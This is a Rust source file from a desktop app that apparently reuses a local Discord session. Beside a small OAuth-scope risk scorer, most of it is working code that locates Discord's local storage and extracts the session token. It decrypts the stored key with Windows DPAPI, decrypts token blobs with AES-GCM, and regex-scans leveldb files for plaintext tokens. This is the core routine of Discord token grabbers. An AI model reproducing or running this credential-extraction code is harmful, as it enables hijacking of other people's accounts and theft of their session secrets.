// src-tauri/src/core/forensics/auditor.rs

use crate::core::error::AppError;
use crate::core::logger::Logger;
use base64::{Engine as _, engine::general_purpose};
use regex::Regex;
use serde_json::Value;
use std::fs;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

pub struct SessionAuditor;

#[derive(serde::Serialize)]
pub struct RiskReport {
    pub risk_score: u32,
    pub warnings: Vec<String>,
}

pub struct IntegrationAuditor;

impl IntegrationAuditor {
    pub fn audit_app(app_json: &Value) -> RiskReport {
        let mut warnings = Vec::new();
        let mut score = 0;

        if let Some(scopes) = app_json["scopes"].as_array() {
            for scope in scopes {
                if let Some(s) = scope.as_str() {
                    match s {
                        "messages.read" => {
                            score += 40;
                            warnings.push("Can read your messages".into());
                        }
                        "guilds.join" => {
                            score += 20;
                            warnings.push("Can join servers for you".into());
                        }
                        "rpc" => {
                            score += 30;
                            warnings.push("Full RPC access".into());
                        }
                        _ => {}
                    }
                }
            }
        }

        RiskReport {
            risk_score: score,
            warnings,
        }
    }
}

impl SessionAuditor {
    /// Dynamically extrapolates the most likely Client ID from the local Discord environment.
    pub fn extrapolate_client_id(app: &tauri::AppHandle) -> String {
        // Known Official Discord Application IDs
        // 947330329678028831: Discord's own "official" ID for activity/RPC
        let default_ids = vec!["947330329678028831", "1473823776247382097"];

        // Attempt to find configured IDs in local settings
        let paths = Self::get_discord_paths();
        for path in paths {
            let settings_path = path.join("settings.json");
            if settings_path.exists() {
                if let Ok(content) = fs::read_to_string(&settings_path) {
                    if let Ok(json) = serde_json::from_str::<Value>(&content) {
                        if let Some(id) = json["client_id"].as_str() {
                            Logger::debug(
                                app,
                                &format!("[Forensics] Extracted client_id from settings: {}", id),
                                None,
                            );
                            return id.to_string();
                        }
                    }
                }
            }
        }

        Logger::warn(
            app,
            "[Forensics] No dynamic client_id found in settings. Using official Discord activity ID.",
            None,
        );
        default_ids[0].to_string()
    }

    /// Attempts to extrapolate an active session token from any local Discord installation.
    pub fn extrapolate_token(app: &tauri::AppHandle) -> Result<String, AppError> {
        let paths = Self::get_discord_paths();
        Logger::info(
            app,
            &format!(
                "[Forensics] Probing {} potential Discord installation paths.",
                paths.len()
            ),
            None,
        );

        for path in paths {
            #[cfg(target_os = "windows")]
            if let Some(token) = Self::extract_encrypted_token(app, &path) {
                return Ok(token);
            }

            if let Some(token) = Self::scan_path_for_plaintext_token(app, &path) {
                return Ok(token);
            }
        }

        Err(AppError {
            user_message: "No active Discord session detected. Please ensure Discord is running and you are logged in.".into(),
            error_code: "no_local_session".into(),
            ..Default::default()
        })
    }

    fn get_discord_paths() -> Vec<PathBuf> {
        let mut paths = Vec::new();

        #[cfg(target_os = "windows")]
        if let Ok(appdata) = std::env::var("APPDATA") {
            let base = PathBuf::from(appdata);
            paths.push(base.join("discord"));
            paths.push(base.join("discordptb"));
            paths.push(base.join("discordcanary"));
        }

        #[cfg(target_os = "macos")]
        if let Ok(home) = std::env::var("HOME") {
            let base = PathBuf::from(home).join("Library/Application Support");
            paths.push(base.join("discord"));
            paths.push(base.join("discordptb"));
            paths.push(base.join("discordcanary"));
        }

        #[cfg(target_os = "linux")]
        if let Ok(home) = std::env::var("HOME") {
            let base = PathBuf::from(home).join(".config");
            paths.push(base.join("discord"));
            paths.push(base.join("discordptb"));
            paths.push(base.join("discordcanary"));
        }

        paths.into_iter().filter(|p| p.exists()).collect()
    }

    #[cfg(target_os = "windows")]
    fn extract_encrypted_token(_app: &tauri::AppHandle, base_path: &Path) -> Option<String> {
        use windows_sys::Win32::Security::Cryptography::{
            CRYPTPROTECT_UI_FORBIDDEN, CryptUnprotectData,
        };

        #[allow(non_snake_case)]
        #[repr(C)]
        struct DATA_BLOB {
            cbData: u32,
            pbData: *mut u8,
        }

        let local_state_path = base_path.join("Local State");
        if !local_state_path.exists() {
            return None;
        }

        let local_state_content = fs::read_to_string(&local_state_path).ok()?;
        let json: Value = serde_json::from_str(&local_state_content).ok()?;
        let encrypted_key_b64 = json["os_crypt"]["encrypted_key"].as_str()?;
        let mut encrypted_key = general_purpose::STANDARD.decode(encrypted_key_b64).ok()?;

        if encrypted_key.len() < 5 || &encrypted_key[0..5] != b"DPAPI" {
            return None;
        }
        let encrypted_blob = &mut encrypted_key[5..];

        let mut data_in = DATA_BLOB {
            cbData: encrypted_blob.len() as u32,
            pbData: encrypted_blob.as_mut_ptr(),
        };
        let mut data_out = DATA_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };

        let success = unsafe {
            CryptUnprotectData(
                &mut data_in as *mut _ as *mut _,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                CRYPTPROTECT_UI_FORBIDDEN,
                &mut data_out as *mut _ as *mut _,
            )
        };

        if success == 0 {
            return None;
        }

        let master_key = unsafe {
            std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec()
        };

        let storage_path = base_path.join("Local Storage").join("leveldb");
        let re_enc = Regex::new(r#"dQw4w9WgXcQ:([^"]+)"#).unwrap();

        for entry in WalkDir::new(storage_path)
            .into_iter()
            .filter_map(|e| e.ok())
        {
            if entry
                .path()
                .extension()
                .map_or(false, |ext| ext == "ldb" || ext == "log")
            {
                if let Ok(content) = fs::read(entry.path()) {
                    let text = String::from_utf8_lossy(&content);
                    for cap in re_enc.captures_iter(&text) {
                        let b64 = &cap[1];
                        let encrypted_token = general_purpose::STANDARD.decode(b64).ok()?;

                        if encrypted_token.len() < 15 {
                            continue;
                        }
                        let iv = &encrypted_token[3..15];
                        let payload = &encrypted_token[15..];

                        if let Ok(token) = Self::decrypt_aes_gcm(&master_key, iv, payload) {
                            return Some(token);
                        }
                    }
                }
            }
        }

        None
    }

    fn decrypt_aes_gcm(key: &[u8], iv: &[u8], payload: &[u8]) -> Result<String, AppError> {
        use aes_gcm::{
            Aes256Gcm,
            aead::{Aead, KeyInit, Nonce},
        };
        let cipher = Aes256Gcm::new_from_slice(key)
            .map_err(|_| AppError::new("Cipher init failed", "crypto_err"))?;
        let nonce = Nonce::<Aes256Gcm>::from_slice(iv);
        let decrypted = cipher
            .decrypt(nonce, payload)
            .map_err(|_| AppError::new("Decryption failed", "crypto_err"))?;
        Ok(String::from_utf8_lossy(&decrypted).to_string())
    }

    fn scan_path_for_plaintext_token(app: &tauri::AppHandle, base_path: &Path) -> Option<String> {
        let storage_path = base_path.join("Local Storage").join("leveldb");
        if !storage_path.exists() {
            return None;
        }

        let re = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|mfa\.[\w-]{84}").unwrap();

        for entry in WalkDir::new(storage_path)
            .into_iter()
            .filter_map(|e| e.ok())
        {
            if entry
                .path()
                .extension()
                .map_or(false, |ext| ext == "ldb" || ext == "log")
            {
                if let Ok(content) = fs::read(entry.path()) {
                    let text = String::from_utf8_lossy(&content);
                    for cap in re.find_iter(&text) {
                        let token = cap.as_str().to_string();
                        if token.len() > 50 {
                            Logger::debug(app, "[Forensics] Plaintext token identified.", None);
                            return Some(token);
                        }
                    }
                }
            }
        }
        None
    }
}
